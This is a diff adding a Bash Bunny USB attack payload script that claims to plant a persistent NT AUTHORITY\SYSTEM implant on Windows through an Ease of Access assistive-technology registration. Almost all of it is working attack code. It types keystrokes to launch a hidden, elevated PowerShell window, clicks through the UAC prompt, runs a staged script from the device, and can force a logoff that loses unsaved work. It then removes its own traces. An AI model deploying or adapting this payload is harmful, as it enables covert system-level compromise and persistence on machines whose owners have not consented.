@@ -1,0 +1,75 @@
+#!/bin/bash
+#
+# Title:         ATNT : Persistent NT AUTHORITY\SYSTEM implant
+# Description:   Uses Windows Ease of Access Assistive Technology (https://docs.microsoft.com/en-us/windows/win32/winauto/ease-of-access---assistive-technology-registration)
+#                To persistently run code with NT AUTHORITY\SYSTEM rights.
+# Author:        9o3
+# Twitter:       @BugBot4
+# Version:       1.1
+# Category:      Execution
+# Attackmodes:   HID, Storage
+#
+# LED STATUS
+# ==========
+# SETUP.......Generate stage file
+# ATTACK......Run hidden elevated PowerShell window that creates the AT and drops associated code
+# CLEANUP.....Remove generated files
+# FINISH......Finished
+#
+# OPTIONS
+# =======
+# Final stage configured from included final_stage.ps1 script
+# FORCE_LOGOFF => Setting this setting to true will forcefully log the user off. Unsaved work on the target may be lost.
+# LOCK_ON_USER => Lock the desktop as soon as the user first logs in. This may cause suspicion for the target user, but only happens once. Doing this starts the AT as NT AUTHORITY/SYSTEM.
+# RUN_IMMEDIATELY => Run the final stage as soon as the AT is ran as NT AUTHORITY/SYSTEM, instead of running it after it has been called from the SECURITY hive.
+FORCE_LOGOFF=true
+LOCK_ON_USER=true
+RUN_IMMEDIATELY=true
+
+######## Generate stage file ########
+# Alter second stage based on settings & merge final stage.ps1 into second stage
+LED SETUP
+GET SWITCH_POSITION
+rm /root/udisk/DONE
+cd /root/udisk/payloads/$SWITCH_POSITION
+if [ "$RUN_IMMEDIATELY" = true ] ; then
+	RUN_IMMEDIATELY_TEXT='iex `$p'
+fi
+if [ "$LOCK_ON_USER" = true ] ; then
+	LOCK_ON_USER_TEXT='rundll32.exe user32.dll,LockWorkStation;'
+fi
+if [ "$FORCE_LOGOFF" = true ] ; then
+	FORCE_LOGOFF_TEXT='(Get-WmiObject -Class Win32_OperatingSystem).Win32Shutdown(4)'
+fi
+
+sed -e "s/#RI#/$RUN_IMMEDIATELY_TEXT/g" -e "s/<#LI#>/$LOCK_ON_USER_TEXT/g" -e "s/#FL#/$FORCE_LOGOFF_TEXT/g" -e '/!FINAL_STAGE!/{
+	s/!FINAL_STAGE!//g
+	r final_stage.ps1
+}' stage2.ps1 > 2
+
+ATTACKMODE HID STORAGE
+
+######## Run hidden elevated PowerShell window ########
+# Runs hidden elevated powershell which executes stage2.ps1
+LED STAGE1
+QUACK GUI r
+QUACK DELAY 500
+QUACK STRING "powershell -w 1 -NoP iex(gc((gwmi win32_volume -f 'label=''BashBunny''').Name+'\payloads\\$SWITCH_POSITION\2')-Raw)"
+QUACK DELAY 200
+QUACK CTRL-SHIFT ENTER
+QUACK DELAY 1200
+QUACK LEFTARROW
+QUACK DELAY 200
+QUACK ENTER
+until [ -f /root/udisk/DONE ]
+do
+	sleep 0.2
+done
+
+######## Remove generated files ########
+# Removes the generated stage file and sync file system
+LED CLEANUP
+rm 2
+rm /root/udisk/DONE
+sync
+LED FINISH
